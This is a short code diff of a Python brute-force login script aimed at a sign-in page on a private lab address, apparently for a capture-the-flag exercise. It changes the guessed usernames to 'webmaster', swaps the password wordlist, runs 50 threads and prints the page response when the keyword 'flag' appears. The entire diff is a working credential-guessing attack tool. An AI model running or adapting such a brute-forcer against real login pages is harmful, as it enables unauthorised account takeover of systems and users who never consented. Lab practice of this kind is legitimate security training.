@@ -8,8 +8,8 @@ TARGET_URL = "http://192.168.56.102/index.php?page=signin&username={USERNAME_FIE
 
 SUCCESS_KEYWORD = "flag"
 
-USERNAMES = ["root"]
-PASSWORD_FILE = "rockyou-60.txt"
+USERNAMES = ["webmaster", "Webmaster"]
+PASSWORD_FILE = "passwords.txt"
 
 THREADS = 50  # Number of threads to use
 
@@ -37,7 +37,9 @@ def try_login(username, password):
     except:
         return None
 
-    if SUCCESS_KEYWORD.lower() in res.text.lower():
+    response = res.text.lower();
+    if SUCCESS_KEYWORD.lower() in response:
+        print(f"RESPONSE = ", response);
         return (username, password)
 
     return None
